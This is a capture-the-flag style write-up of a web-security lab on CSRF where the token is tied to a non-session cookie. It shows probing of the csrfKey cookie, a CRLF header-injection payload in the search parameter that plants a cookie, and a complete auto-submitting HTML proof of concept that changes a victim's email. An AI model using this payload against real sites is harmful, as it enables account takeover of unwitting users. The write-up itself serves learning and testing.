# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/48a33bf9-4b46-4623-b486-8713da08cf8b/2024-02-19_09-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=bb1f010b10b74afaa5061db9a5839e81ad555d17fa01ed523b0f19fc7f6230bc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/660e4e77-f387-4cc6-a69a-54867b104a3a/2024-02-19_09-47.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=2a6c85b492b52556363b6cbde0a2b96f4c7ece7974b508d0fa92e3f8a96a1b63&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

> 💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
    - Submit an invalid CSRF token
    - Submit a valid CSRF token from another user
—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c193d7c0-226f-4233-af37-70b28ae92d9c/2024-02-19_09-54.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=d6c00f75d449a431fae4300326f361075fe403f6eda98e310ed1e397106b3211&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/9e4f597b-c136-4cde-8a1f-e406f9b8c932/2024-02-19_10-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=a2b681ad922eb0d77bbd6d439bb74f2dfd4a100e5c4bbe406221a25e4c736a09&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

> To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.

**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line
**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/85df3058-0706-4239-9d26-27f80ae15a72/2024-02-19_10-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=6bfab54c5190b944ab4d279ce8df8cb461982f0b1d67bc078451d0160ac87066&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/39a7df58-e6fb-4bcf-9624-13ebea3239b0/2024-02-20_15-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466USAAFWBA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCPHqq5E64GCmiZH6xPzzR3lHzwW8CAQn4tyBbyDc%2FvZgIgTA4uh2VRQMdtZb0nuzBc9nZGnfFR5x29idMx44LFS7wqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDVRQIDCNHWqdQlZlircA2YdxrNCgk40cpjv%2BcaaqGLEQH65Gct8IRoONzBnwNQt39gqph4duPMm1wwksPmNFUbFKk2myp30Ah65Uo73wqVfqm4T0b3p%2FllRUMkhViZSsEYh7vi5aSWCVFbRmomkXXX5UmaWBLHb1fxmtzLAvTvL%2F1cnXZ9p%2BSMDkoIYbaXB6OsrmlKj7PbYa3AaQ2mOJLKdVaUuF%2ByTYyQ04kaFPqBtZhw6MvzdN%2Bgv%2FWJvoQfChKyP%2BlPfK5kT8MLQE6aKHLdQa6HvR11LVSiDxIwNVY0CRIIGdj%2Fmw3iZVSXTzpoa1BgzPJYcrozRpUWgN%2FFEclsRW54akIAqfHeZSCpZXchJQ79pzvG9k%2FOgt8QmSvLxQXmD%2BIvzDgwWA6LxuIK20nuAkQtGj3C%2FXPR33JR1NOdwOet73M4w6huz7JMPCgIZEzoyxWqW%2FXd%2BYov9FgimiA%2FFQR1o%2Ba1JRCyPq5JijH%2BNmYsWP%2FvJnEjBl0lMO1QmXbRUWfwzaT58ntWSefYJsM1b0oPZigiyZMR%2FD8GTIlfJts%2BenGUNM44t8kzxFvXXzlJvxU0IYQkzDEUROSeE%2FlVw31GHjJgys6Q8FaLFFKZ6gcn33XpOERsHF5zDCzDrdCk%2FHVtsEJbJPUZeMLnGotQGOqUBaLS%2Buyg4hl%2BpOPfAitvR03phlu%2FtICqOZqw%2Fa9bVW9CcckIMHiz4haG9CNvJZYJloZQK6zPq0asHBiLN2X0RPlkVQ6%2BhJpYK%2Fmr84VBo0gNOP0YOXA7DSerUHhSKe74rP97HaiCH4GjTPokW2hYmR4mTrR%2F5Np1Xt40fwgBg61uMq7Yp31lxtcVCzls3w3Y4%2BEvuu2xL98yjw2gV2FqGf3k3F5Sb&X-Amz-Signature=963ba7bbf5c158fbdadab77280c20d9b398e1ac2b5e1821484921aafefcb7c73&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

